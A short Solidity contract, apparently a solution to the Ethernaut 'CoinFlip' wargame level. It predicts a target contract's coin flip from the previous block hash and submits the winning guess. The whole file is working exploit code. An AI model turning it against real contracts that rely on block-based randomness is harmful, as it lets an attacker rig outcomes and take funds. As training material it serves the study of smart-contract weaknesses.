// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipExploit {
    using SafeMath for uint256;
    address coinflip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinflip) public {
        coinflip = _coinflip;
    }

    function exploit() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool answer = coinFlip == 1 ? true : false;

        ICoinFlip(coinflip).flip(answer);
    }
}
